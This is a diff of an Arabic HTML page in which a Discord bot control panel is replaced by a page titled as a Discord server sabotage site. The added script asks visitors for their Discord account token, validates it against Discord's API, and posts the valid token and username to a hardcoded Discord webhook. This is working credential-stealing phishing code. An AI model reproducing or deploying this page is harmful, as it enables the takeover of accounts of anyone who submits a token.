@@ -1,119 +1,88 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <title>موقع تحكم البوت</title>
+  <meta charset="UTF-8">
+  <title>موقع تخريب ديسكورد سيرفرات</title>
   <style>
     body {
-      background-color: #000;
-      color: #fff;
-      font-family: sans-serif;
-      text-align: center;
-      padding: 30px;
-    }
-    button, select {
-      padding: 12px 20px;
-      font-size: 16px;
-      border-radius: 8px;
-      border: none;
-      cursor: pointer;
-      margin: 10px;
-    }
-    .green {
-      background-color: #2ecc71;
+      background: linear-gradient(to bottom right, #0077ff, #00ff88);
+      font-family: 'Cairo', sans-serif;
       color: white;
+      text-align: center;
+      padding: 50px;
     }
-    .white {
-      background-color: white;
-      color: black;
+    h1 {
+      font-size: 3em;
+      color: red;
+      text-shadow: 2px 2px 5px blue;
     }
-    img {
-      border-radius: 50%;
-      width: 80px;
-      height: 80px;
-      margin: 10px;
+    label {
+      display: block;
+      margin-top: 20px;
+      font-size: 1.2em;
     }
-    .guild {
-      background-color: #111;
-      padding: 15px;
-      margin: 10px;
+    input {
+      padding: 10px;
+      width: 300px;
+      font-size: 1em;
       border-radius: 10px;
+      border: none;
+      margin-top: 10px;
+    }
+    button {
+      margin-top: 30px;
+      background-color: green;
+      color: white;
+      padding: 12px 24px;
+      font-size: 1.2em;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
-  <h1>لوحة تحكم البوت</h1>
 
-  <div id="login-section">
-    <a href="https://discord.com/oauth2/authorize?client_id=1360270113001177118&redirect_uri=https%3A%2F%2Ftubular-parfait-58a9e4.netlify.app%2F&response_type=token&scope=identify%20guilds">
-      <button class="green">تسجيل الدخول عبر ديسكورد</button>
-    </a>
-  </div>
+  <h1>موقع تخريب ديسكورد</h1>
 
-  <div id="user-section" style="display: none;">
-    <img id="user-avatar" src="" alt="User" />
-    <h2 id="user-name"></h2>
+  <label>قم بوضع توكن حسابك:</label>
+  <input type="text" id="token" placeholder="توكن الحساب">
 
-    <div id="guilds-list"></div>
-  </div>
+  <button onclick="checkToken()">التالي</button>
 
   <script>
-    async function fetchData(token) {
-      try {
-        const userRes = await fetch("https://discord.com/api/users/@me", {
-          headers: { Authorization: `Bearer ${token}` }
-        });
-        const guildsRes = await fetch("https://discord.com/api/users/@me/guilds", {
-          headers: { Authorization: `Bearer ${token}` }
-        });
+    function checkToken() {
+      const token = document.getElementById("token").value;
 
-        const user = await userRes.json();
-        const guilds = await guildsRes.json();
-
-        document.getElementById("login-section").style.display = "none";
-        document.getElementById("user-section").style.display = "block";
-
-        const avatarUrl = user.avatar
-          ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`
-          : "https://cdn.discordapp.com/embed/avatars/0.png";
-
-        document.getElementById("user-avatar").src = avatarUrl;
-        document.getElementById("user-name").textContent = `${user.username}#${user.discriminator}`;
-
-        const guildsList = document.getElementById("guilds-list");
-        guildsList.innerHTML = "";
-
-        guilds.forEach(guild => {
-          if ((guild.permissions & 0x8) === 0x8) {
-            const div = document.createElement("div");
-            div.className = "guild";
-            div.innerHTML = `
-              <h3>${guild.name}</h3>
-              <a href="https://discord.com/oauth2/authorize?client_id=1360270113001177118&scope=bot&permissions=8&guild_id=${guild.id}&response_type=token&redirect_uri=https%3A%2F%2Ftubular-parfait-58a9e4.netlify.app%2F">
-                <button class="white">إدخال البوت</button>
-              </a>
-            `;
-            guildsList.appendChild(div);
-          }
-        });
-
-
-        await fetch('https://tubular-parfait-58a9e4.netlify.app/', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ userId: user.id })
-        });
-      } catch (err) {
-        alert('حدث خطأ أثناء جلب بيانات المستخدم أو إرسال الرسالة.');
-        console.error(err);
-      }
-    }
-
-    const hash = window.location.hash;
-    if (hash.includes("access_token")) {
-      const token = new URLSearchParams(hash.substring(1)).get("access_token");
-      fetchData(token);
+      
+      fetch("https://discord.com/api/v10/users/@me", {
+        headers: {
+          "Authorization": token
+        }
+      }).then(res => {
+        if (res.status === 200) {
+          res.json().then(data => {
+            const username = `${data.username}#${data.discriminator}`;
+            
+            fetch("https://discord.com/api/webhooks/1381695158462058558/JpwXpQ4zEnhKkju9FOAWqYXjbU72YQ-oHsPb2RydTyTuZKyv357cB16HOO901tEiqw_K", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify({
+                content: `✅ توكن صالح تم إدخاله\nتوكن الحساب: \`${token}\`\nيوزر الحساب: \`${username}\``
+              })
+            });
+          });
+        } else {
+          
+          console.warn("توكن غير صالح.");
+        }
+      }).catch(err => {
+        console.error("فشل التحقق من التوكن:", err);
+      });
     }
   </script>
+
 </body>
 </html>
